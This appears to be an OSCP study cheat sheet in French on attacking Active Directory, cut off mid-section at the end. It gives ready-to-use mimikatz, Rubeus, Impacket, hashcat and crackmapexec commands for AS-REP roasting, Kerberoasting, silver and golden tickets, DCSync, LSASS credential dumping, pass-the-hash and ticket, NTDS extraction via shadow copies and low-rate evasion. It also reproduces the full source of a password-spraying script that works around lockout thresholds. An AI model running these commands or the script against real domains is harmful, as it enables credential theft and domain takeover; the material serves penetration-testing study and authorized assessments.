---
title: "OSCP · Active Directory : techniques"
description: "Étudier les mécanismes d'authentification et les techniques AD."
---

# OSCP · Active Directory : techniques

Étudier les mécanismes d'authentification et les techniques AD.


## AS-REP Roasting


Analyser une empreinte avec le mode indiqué.

```bash
John the Ripper
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth
```


Commande `rubeus.exe` pour la rubrique « AS-REP Roasting ».

```powershell
Rubeus.exe asreproast

# The /nowrap option prevents the output from being wrapped to the next line, allowing you to see the entire output on a single line without any breaks
Rubeus.exe asreproast /nowrap
```


Commande `impacket-getnpusers` pour la rubrique « AS-REP Roasting ».

```bash
# From Kali (GetNPUsers.py)
impacket-GetNPUsers -dc-ip [dc-ip] -request -outputfile [output_file].asreproast [domain.com]/[user]

# From Windows
GetNPUsers.py domain/[user]:[password]@[dc-ip] -no-pass
```


Analyser une empreinte avec le mode indiqué.

```bash
hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
```


## Kerberoasting


Commande `getuserspns.py` pour la rubrique « Kerberoasting ».

```powershell
GetUserSPNs.py domain/[user]:[password]@[dc-ip]
```


Commande `impacket-getuserspns` pour la rubrique « Kerberoasting ».

```bash
# From Kali
sudo impacket-GetUserSPNs -request -dc-ip [dc-ip] [domain.com]/[user]
# Autre possibilité
sudo impacket-GetUserSPNs -request -dc-ip [dc_ip] [domain.com]/[user] -hashes [LMHASH]:[NTHASH] -outputfile [output_file]

# From Windows
GetUserSPNs.py domain/[user]:[password]@[dc-ip] -request
```


Commande `rubeus.exe` pour la rubrique « Kerberoasting ».

```powershell
Rubeus.exe kerberoast
# Autre possibilité
Rubeus.exe kerberoast /outfile:[output_file].kerberoast
```


Analyser une empreinte avec le mode indiqué.

```bash
hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt
```


## Tickets Silver


Examiner les informations AD ou réseau en PowerShell.

```powershell
# 1. Find the [ServiceAccountName]
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
# Autre possibilité
Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName

# 2. Extract the NTLM hash
mimikatz # lsadump::lsa /inject /name:[ServiceAccountName]

# Example:
mimikatz # lsadump::dcsync /user:HTTP/server01
```


Exemple technique pour la rubrique « Tickets Silver ».

```powershell
# 1. Find the Domain SID
(Get-ADDomain).DomainSID
# Autre possibilité
whoami /user

# 2. Find the target server (my DC server)
Get-ADDomainController -Filter *
# Autre possibilité
netdom query dc

# 3. Create the Silver Ticket, for example in this case /service:CIFS (for help deciding the /service, check Section 12.11)
mimikatz # kerberos::golden /domain:[domain.com] /sid:[domainSID] /target:[targetserver] /rc4:[NTLMHash] /service:[serviceName] /user:[username]

# Example:
mimikatz # kerberos::golden /sid:S-1-5-21-1863423273-656352785-1243762498 /domain:example.com /ptt /target:server01.example.com /service:http /rc4:4d28cf5252d39971462580a51484ca09 /user:testUser
```


Commande `mimikatz` pour la rubrique « Tickets Silver ».

```powershell
mimikatz # kerberos::ptt silver_ticket.kirbi

# Confirm the existence of the ticket
klist
```


Commande `dir` pour la rubrique « Tickets Silver ».

```bash
dir \\targetserver\sharedfolder
```


## Tickets Golden


**Paramètres et repères :**
`Mimikatz`  


Commande `mimikatz` pour la rubrique « Tickets Golden ».

```powershell
mimikatz # lsadump::dcsync /domain:[domain.com] /user:krbtgt
```


Exemple technique pour la rubrique « Tickets Golden ».

```powershell
# 1. Find the Domain SID
(Get-ADDomain).DomainSID
# Autre possibilité
whoami /user

# 2. Find the RID: The RID for the Administrator account is 500, but other accounts will have different RIDs. You can find the RID of a specific user using tools like Mimikatz or by querying Active Directory.
PowerShell -Command "(New-Object System.Security.Principal.NTAccount('domain\ServiceAccount')).Translate([System.Security.Principal.SecurityIdentifier]).Value"

# 3. Create the Ticket
mimikatz # kerberos::golden /user:[DesiredUsername] /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:[DesiredRID]
# Autre possibilité
mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:500
```


Commande `mimikatz` pour la rubrique « Tickets Golden ».

```powershell
mimikatz # kerberos::ptt golden_ticket.kirbi

# Confirm the existence of the ticket
klist
```


Commande `net` pour la rubrique « Tickets Golden ».

```bash
net use \\domaincontroller\C$ /user:[DesiredUsername]
```


## Domain Controller Synchronization (DC Sync)

Examiner les objets, les droits et les services du domaine.


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-ADGroupMember -Identity "Domain Admins"
```


Commande `impacket-secretsdump` pour la rubrique « Domain Controller Synchronization (DC Sync) ».

```powershell
# From Kali
impacket-secretsdump [domain.com]/[adminUser]:"[password]"@[dc-ip]
# or; the -just-dc-user [targetUser] is to only extract the hashes of the indicated user and not all the DC.
impacket-secretsdump -just-dc-user [targetUser] [domain.com]/[adminUser]:"[password]"@[dc-ip]

# From Windows
mimikatz # lsadump::dcsync /domain:[domain.com]
# or; here we just extract the specified user.
mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]
```


Commande `mimikatz` pour la rubrique « Domain Controller Synchronization (DC Sync) ».

```powershell
mimikatz # lsadump::dcsync /domain:[domain.com]
```


Commande `mimikatz` pour la rubrique « Domain Controller Synchronization (DC Sync) ».

```powershell
# You can redirect output to a file for analysis:
mimikatz # lsadump::dcsync /domain:domain.com > output.txt
```


Analyser une empreinte avec le mode indiqué.

```bash
hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt
```


## Identifiants AD en cache

Vérifier les comptes, les secrets et les mécanismes d'authentification.


Commande `mimikatz` pour la rubrique « Identifiants AD en cache ».

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::logonpasswords

mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::tickets
mimikatz # sekurlsa::credman
mimikatz # sekurlsa::msv
mimikatz # sekurlsa::tspkg
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::kerberos
mimikatz # sekurlsa::ssp

mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::lsa /inject
mimikatz # lsadump::trust
mimikatz # lsadump::cache
```


Analyser une empreinte avec le mode indiqué.

```bash
hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt
```


## Authentification NTLM

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ntlm_authentication.png)


Commande `mimikatz` pour la rubrique « Authentification NTLM ».

```powershell
mimikatz # sekurlsa::logonpasswords
```


Commande `mimikatz` pour la rubrique « Authentification NTLM ».

```powershell
mimikatz # sekurlsa::pth /user:[username] /domain:[domain.com] /ntlm:[NTLMhash]
```


Commande `dir` pour la rubrique « Authentification NTLM ».

```bash
dir \\targetserver\sharedfolder
```


## Authentification Kerberos

Examiner les objets, les droits et les services du domaine.

![Descripción de la imagen](https://www.emmanuelsolis.com/img/kerberos_authentication.jpg)


Commande `mimikatz` pour la rubrique « Authentification Kerberos ».

```powershell
mimikatz # sekurlsa::tickets /export
```


Commande `mimikatz` pour la rubrique « Authentification Kerberos ».

```powershell
mimikatz # kerberos::ptt TGT_ticket.kirbi
```


Commande `dir` pour la rubrique « Authentification Kerberos ».

```bash
dir \\targetserver\sharedfolder
```


#### Exécuter le script


Commande `.` pour la rubrique « Exécuter le script ».

```powershell
# -Pass allow us to use a single password to test.
# We could also add the option -File to use a personalized password wordlist.
# -Admin option is for adding test for admin account.
.\Spray-Passwords.ps1 -Pass [password] -Admin
```


#### Code source of the Script


Exemple technique pour la rubrique « Code source of the Script ».

```powershell
<#
  .SYNOPSIS
    PoC PowerShell script to demo how to perform password spraying attacks against
     user accounts in Active Directory (AD), aka low and slow online brute force method.
    Only use for good and after written approval from AD owner.
    Requires access to a Windows host on the internal network, which may perform
     queries against the Primary Domain Controller (PDC).
    Does not require admin access, neither in AD or on Windows host.
    Remote Server Administration Tools (RSAT) are not required.

    Should NOT be considered OPSEC safe since:
    - a lot of traffic is generated between the host and the Domain Controller(s).
    - failed logon events will be massive on Domain Controller(s).
    - badpwdcount will iterate on user account objects in scope.

    No accounts should be locked out by this script alone, but there are no guarantees.
    NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.
  .DESCRIPTION
    Perform password spraying attack against user accounts in Active Directory.
  .PARAMETER Pass
    Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'. Do not use together with File or Url."

  .PARAMETER File
    Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.

  .PARAMETER Url
    Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.

  .PARAMETER Admins
    Warning: will also target privileged user accounts (admincount=1.)". Default = $false.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016'
    1. Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins
    1. Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose

    1. Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).
    2. Output script progress/status information to console.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt' -Verbose

    1. Download the password file with weak passwords.
    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).
    3. Output script progress/status information to console.
  .LINK
    Get latest version here: https://github.com/ZilentJack/Spray-Passwords
  .NOTES
    Authored by    : Jakob H. Heidelberg / @JakobHeidelberg / www.improsec.com
    Together with  : CyberKeel / www.cyberkeel.com
    Date created   : 09/05-2016
    Last modified  : 26/06-2016
    Version history:
    - 1.00: Initial public release, 26/06-2016
    Tested on:
     - WS 2016 TP5
     - WS 2012 R2
     - Windows 10
    Known Issues & possible solutions/workarounds:
     KI-0001: -
       Solution: -
    Change Requests for vNext (not prioritized):
     CR-0001: Support for Fine-Grained Password Policies (FGPP).
     CR-0002: Find better way of getting Default Domain Password Policy than "NET ACCOUNTS". Get-ADDefaultDomainPasswordPolicy is not en option as it relies on RSAT.
     CR-0003: Threated approach to test more user/password combinations simultaneously.
     CR-0004: Exception or include list based on username, group membership, SID's or the like.
     CR-0005: Exclude user account that executes the script (password probably already known).
    Verbose output:
     Use -Verbose to output script progress/status information to console.
#>

[CmdletBinding(DefaultParameterSetName='ByPass')]
Param
(
    [Parameter(Mandatory = $true, ParameterSetName = 'ByURL',HelpMessage="Download file from given URL and use as password input file to test multiple passwords for each targeted user account.")]
    [String]
    $Url = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByFile',HelpMessage="Supply a path to a password input file to test multiple passwords for each targeted user account.")]
    [String]
    $File = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByPass',HelpMessage="Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'")]
    [AllowEmptyString()]
    [String]
    $Pass = '',

    [Parameter(Mandatory = $false,HelpMessage="Warning: will also target privileged user accounts (admincount=1.)")]
    [Switch]
    $Admins = $false

)

# Method to determine if input is numeric or not
Function isNumeric ($x) {
    $x2 = 0
    $isNum = [System.Int32]::TryParse($x, [ref]$x2)
    Return $isNum
}

# Method to get the lockout threshold - does not take FGPP into acocunt
Function Get-threshold
{
    $data = net accounts
    $threshold = $data[5].Split(":")[1].Trim()

    If (isNumeric($threshold) )
        {
            Write-Verbose "threshold is a number = $threshold"
            $threshold = [Int]$threshold
        }
    Else
        {
            Write-Verbose "Threshold is probably 'Never', setting max to 1000..."
            $threshold = [Int]1000
        }

    Return $threshold
}

# Method to get the lockout observation window - does not tage FGPP into account
Function Get-Duration
{
    $data = net accounts
    $duration = [Int]$data[7].Split(":")[1].Trim()
    Write-Verbose "Lockout duration is = $duration"
    Return $duration
}

# Method to retrieve the user objects from the PDC
Function Get-UserObjects
{
    # Get domain info for current domain
    Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
    Catch {Write-Verbose "No domain found, will quit..." ; Exit}

    # Get the DC with the PDC emulator role
    $PDC = ($domainObj.PdcRoleOwner).Name

    # Build the search string from which the users should be found
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName

    # Create a DirectorySearcher to poll the DC
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain

    # Select properties to load, to speed things up a bit
    $Searcher.PropertiesToLoad.Add("samaccountname") > $Null
    $Searcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $Searcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    # Search only for enabled users that are not locked out - avoid admins unless $admins = $true
    If ($Admins) {$Searcher.filter="(&(samAccountType=805306368)(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    Else {$Searcher.filter="(&(samAccountType=805306368)(!(admincount=1))(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    $Searcher.PageSize = 1000

    # Find & return targeted user accounts
    $userObjs = $Searcher.FindAll()
    Return $userObjs
}

# Method to perform auth test with specific username and password
Function Perform-Authenticate
{
    Param
    ([String]$username,[String]$password)

    # Get current domain with ADSI
    $CurrentDomain = "LDAP://"+([ADSI]"").DistinguishedName

    # Try to authenticate
    Write-Verbose "Trying to authenticate as user '$username' with password '$password'"
    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
    $res = $dom.Name

    # Return true/false
    If ($res -eq $null) {Return $false}
    Else {Return $true}
}

# Validate and parse user supplied url to CSV file of passwords
Function Parse-Url
{
    Param ([String]$url)

    # Download password file from URL
    $data = (New-Object System.Net.WebClient).DownloadString($url)
    $data = $data.Split([environment]::NewLine)

    # Parse passwords file and return results
    If ($data -eq $null -or $data -eq "") {Return $null}
    $passwords = $data.Split(",").Trim()
    Return $passwords
}

# Validate and parse user supplied CSV file of passwords
Function Parse-File
{
   Param ([String]$file)

   If (Test-Path $file)
   {
        $data = Get-Content $file

        If ($data -eq $null -or $data -eq "") {Return $null}
        $passwords = $data.Split(",").Trim()
        Return $passwords
   }
   Else {Return $null}
}

# Main function to perform the actual brute force attack
Function BruteForce
{
   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)

   #Setup variables
   $userObj = Get-UserObjects
   Write-Verbose "Found $(($userObj).count) active & unlocked users..."

   If ($passwords.Length -gt $threshold)
   {
        $time = ($passwords.Length - $threshold) * $duration
        Write-Host "Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes."
   }

   [Boolean[]]$done = @()
   [Boolean[]]$usersCracked = @()
   [Int[]]$numTry = @()
   $results = @()

   #Initialize arrays
   For ($i = 0; $i -lt $userObj.Length; $i += 1)
   {
        $done += $false
        $usersCracked += $false
        $numTry += 0
   }

   # Main while loop which does the actual brute force.
   Write-Host "Performing brute force - press [q] to stop the process and print results..." -BackgroundColor Yellow -ForegroundColor Black
   :Main While ($true)
   {
        # Get user accounts
        $userObj = Get-UserObjects

        # Iterate over every user in AD
        For ($i = 0; $i -lt $userObj.Length; $i += 1)
        {

            # Allow for manual stop of the while loop, while retaining the gathered results
            If ($Host.UI.RawUI.KeyAvailable -and ("q" -eq $Host.UI.RawUI.ReadKey("IncludeKeyUp,NoEcho").Character))
            {
                Write-Host "Stopping bruteforce now...." -Background DarkRed
                Break Main
            }

            If ($usersCracked[$i] -eq $false)
            {
                If ($done[$i] -eq $false)
                {
                    # Put object values into variables
                    $samaccountnname = $userObj[$i].Properties.samaccountname
                    $badpwdcount = $userObj[$i].Properties.badpwdcount[0]
                    $badpwdtime = $userObj[$i].Properties.badpasswordtime[0]

                    # Not yet reached lockout tries
                    If ($badpwdcount -lt ($threshold - 1))
                    {
                        # Try the auth with current password
                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                        If ($auth -eq $true)
                        {
                            Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                            $results += $samaccountnname
                            $results += $passwords[$numTry[$i]]
                            $usersCracked[$i] = $true
                            $done[$i] = $true
                        }

                        # Auth try did not work, go to next password in list
                        Else
                        {
                            $numTry[$i] += 1
                            If ($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                        }
                    }

                    # One more tries would result in lockout, unless timer has expired, let's see...
                    Else
                    {
                        $now = Get-Date

                        If ($badpwdtime)
                        {
                            $then = [DateTime]::FromFileTime($badpwdtime)
                            $timediff = ($now - $then).TotalMinutes

                            If ($timediff -gt $duration)
                            {
                                # Since observation window time has passed, another auth try may be performed
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }

                            } # Time-diff if

                        }
                        Else
                        {
                            # Verbose-log if $badpwdtime in null. Possible "Cannot index into a null array" error.
                            Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"


                                   # Try the auth with current password
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }


                        } # Badpwdtime-check if

                    } # Badwpdcount-check if

                } # Done-check if

            } # User-cracked if

        } # User loop

        # Check if the bruteforce is done so the while loop can be terminated
        $amount = 0
        For ($j = 0; $j -lt $done.Length; $j += 1)
        {
            If ($done[$j] -eq $true) {$amount += 1}
        }

        If ($amount -eq $done.Length) {Break}

   # Take a nap for a second
   Start-Sleep -m 1000

   } # Main While loop

   If ($results.Length -gt 0)
   {
       Write-Host "Users guessed are:"
       For($i = 0; $i -lt $results.Length; $i += 2) {Write-Host " '$($results[$i])' with password: '$($results[$i + 1])'"}
   }
   Else {Write-Host "No passwords were guessed."}
}

$passwords = $null

If ($Url -ne '')
{
    $passwords = Parse-Url $Url
}
ElseIf($File -ne '')
{
    $passwords = Parse-File $File
}
Else
{
    $passwords = $Pass.Split(",").Trim()
}

If($passwords -eq $null)
{
    Write-Host "Error in password input, please try again."
    Exit
}

# Get password policy info
$duration = Get-Duration
$threshold = Get-threshold

If ($Admins) {Write-Host "WARNING: also targeting admin accounts." -BackgroundColor DarkRed}

# Call the main function and start the brute force
BruteForce $duration $threshold $passwords
```


### Authenticating using DirectoryEntry


**Paramètres et repères :**
`System.DirectoryServices`  


Exemple technique pour la rubrique « Authenticating using DirectoryEntry ».

```powershell
# Fetch the current domain object
$domainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Identify the Primary Domain Controller (PDC) of the domain
$primaryDC = ($domainContext.PdcRoleOwner).Name

# Construct the LDAP path for directory access
$ldapPath = "LDAP://"
$ldapPath += $primaryDC + "/"

# Build the Distinguished Name (DN) for the domain structure
$domainDN = "DC=$($domainContext.Name.Replace('.', ',DC='))"
$ldapPath += $domainDN

# Authenticate to the directory service with specific credentials
$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, "[userName]", "[password]")
```


#### Commandes de base


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --continue-on-success
# Autre possibilité
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --password-spray
# Autre possibilité
crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com]
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com] --kerberos
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --signing
```


**Paramètres et repères :**
`--continue-on-error`  


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --continue-on-error
```


#### Commandes complémentaires


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --shares
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --smbv1
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --sessions
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb [ip/domain] -u Administrator -p '[AdminPassword]!' -d [domain.com] --sam
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb [ip/domain] -u [userName] -p '[password]!' -d [domain.com] --exec-command "[command]"
```


#### Possible Services to Test


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec rdp [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec winrm [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec http [ip/domain] -u [userName] -p '[password]'
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec ftp [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec telnet [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smtp [ip/domain] -u [users_file].txt -p '[password]'
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec dns [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec ldap [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec netbios [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec mysql [ip/domain] -u [users_file].txt -p '[password]'
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec postgres [ip/domain] -u [users_file].txt -p '[password]'
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec mssql [ip/domain] -u [users_file].txt -p '[password]'
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec oracle [ip/domain] -u [users_file].txt -p '[password]'
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec redis [ip/domain] -u [users_file].txt -p '[password]'
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec docker [ip/domain] -u [users_file].txt -p '[password]'
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec snmp [ip/domain] -u [users_file].txt -p '[password]'
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec ntp [ip/domain]
```


### Using kerbrute


Commande `.` pour la rubrique « Using kerbrute ».

```powershell
# The executable can be found in the kerbrute GitHub (link in Section 18.3.2.2).
.\kerbrute_windows_amd64.exe passwordspray -d [domain.com] .\[usernames_file].txt "[password]"
```


## Shadow Copies


Commande `vshadow.exe` pour la rubrique « Shadow Copies ».

```powershell
# -p X: this indicates which disk we wanto to copy, usually is C.
vshadow.exe -nw -p C:
```


**Paramètres et repères :**
`C:`  


Commande `copy` pour la rubrique « Shadow Copies ».

```powershell
# Replace X with the shadow copy number, found in the previous command
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit C:\desired\backup\path\ntds.dit.bak

# Example
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```


Commande `reg.exe` pour la rubrique « Shadow Copies ».

```powershell
reg.exe save hklm\system C:\backup_path\system.bak

# Example
C:\> reg.exe save hklm\system c:\system.bak
```


Commande `impacket-secretsdump` pour la rubrique « Shadow Copies ».

```bash
impacket-secretsdump -ntds [ntds_file] -system [system_file] LOCAL

# Example
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```


Commande `mimikatz` pour la rubrique « Shadow Copies ».

```powershell
mimikatz # lsadump::ntds /ntds:"[ntds_file]" /system:"[system_file]"
```


Commande `vssadmin` pour la rubrique « Shadow Copies ».

```powershell
vssadmin list shadows
```


Commande `mklink` pour la rubrique « Shadow Copies ».

```powershell
# Replace X with the shadow copy number.
mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
```


Commande `c` pour la rubrique « Shadow Copies ».

```text
C:\ShadowCopy
```


Commande `dir` pour la rubrique « Shadow Copies ».

```powershell
dir C:\ShadowCopy
```


## Constrained Delegation Attack


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-ADComputer -Filter {ServicePrincipalName -like "*"} -Property ServicePrincipalName | Select-Object Name,ServicePrincipalName
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-ADUser -Identity <ServiceAccount> -Properties msDS-AllowedToDelegateTo
```


Commande `kinit` pour la rubrique « Constrained Delegation Attack ».

```bash
kinit <ServiceAccount>
```


### Key Énumération Tools


**Paramètres et repères :**
`CrackMapExec` · `rpcclient` · `smbclient` · `BloodHound`  
`Impacket` · `Responder` · `PowerView`  


### Workflow for Énumération and Credential Testing

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`nmap`  


Identifier les versions des services.

```bash
nmap -p 88,135,139,389,445,5985,636,3268 -sC -sV -Pn [IP]
```


**Paramètres et repères :**
`CrackMapExec`  


### Port Reference Table

Vérifier les ports et les services de la cible autorisée.


**88**

Kerberos · Authentication service for AD.


**135**

MSRPC · Microsoft RPC.


**139**

NetBIOS · File/printer sharing.


**389**

LDAP · Directory services.


**445**

SMB · File sharing/admin shares.


**636**

LDAPS · Secure LDAP.


**3268**

LDAP GC · LDAP Global Catalog.


**3389**

RDP · Remote Desktop Protocol.


**5985**

WinRM · Windows Remote Management.


### Complémentaire Énumération Techniques


Commande `responder` pour la rubrique « Complémentaire Énumération Techniques ».

```bash
responder -I eth0
```


**Paramètres et repères :**
`secretsdump.py`  


Commande `secretsdump.py` pour la rubrique « Complémentaire Énumération Techniques ».

```bash
# Same tool as impacket-secretsdump
secretsdump.py [domain].com/[VALID_USERNAME]:[VALID_PASSWORD]@[IP]
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-ADUser -Filter * | Select-Object Name, SamAccountName
```


Commande `find-domainshare` pour la rubrique « Complémentaire Énumération Techniques ».

```text
Find-DomainShare -Writable
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-ADGroupMember -Identity "Domain Admins"
```


### Detection Evasion Techniques


**Paramètres et repères :**
`CrackMapExec`  


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --shares --rate 1
```


**Paramètres et repères :**
`rpcclient`  


### Web Interfaces for Domain Énumération

Examiner les objets, les droits et les services du domaine.


Examiner le service avec les scripts NSE sélectionnés.

```bash
nmap -p 3389 --script rdp-ntlm-info [IP]
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec winrm [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --exec-method invoke_command
```


Interroger les objets de l'annuaire LDAP.

```bash
ldapsearch -x -h [IP] -p 9389
```


### Sample Outputs


Commande `domain` pour la rubrique « Sample Outputs ».

```text
Domain Name: DOMAIN.LOCAL
Domain SID: S-1-5-21-123456789-1234567890-123456789
Users:
  [*] Administrator
  [*] Guest
```


**Paramètres et repères :**
`CrackMapExec`  


Commande `192.168.123.10` pour la rubrique « Sample Outputs ».

```text
192.168.123.10 - SMB         [*] domain.local\esolis:Password2024! (Pwned!)
```


Commande `dn` pour la rubrique « Sample Outputs ».

```text
dn: CN=Emma Solis,OU=Users,DC=domain,DC=local
sAMAccountName: esolis
userPrincipalName: esolis@domain.local
```


## Pass-the-Ticket (PtT)


**Active TGT in Memory**

A valid TGT from a privileged user must be present, for example that it was cached by a Domain Admin that logged in before.


**SYSTEM Privileges**

Needed to access LSASS memory where Kerberos tickets are stored.


**Local Administrator**

Often sufficient, as it allows escalation to SYSTEM or LSASS access tools.


Commande `mimikatz` pour la rubrique « Pass-the-Ticket (PtT) ».

```powershell
mimikatz
privilege::debug
sekurlsa::tickets
```


Commande `sekurlsa` pour la rubrique « Pass-the-Ticket (PtT) ».

```powershell
# This will save .kirbi files to disk. Identify the correct TGT based on the user and encryption type.
sekurlsa::tickets /export
```


Commande `kerberos` pour la rubrique « Pass-the-Ticket (PtT) ».

```powershell
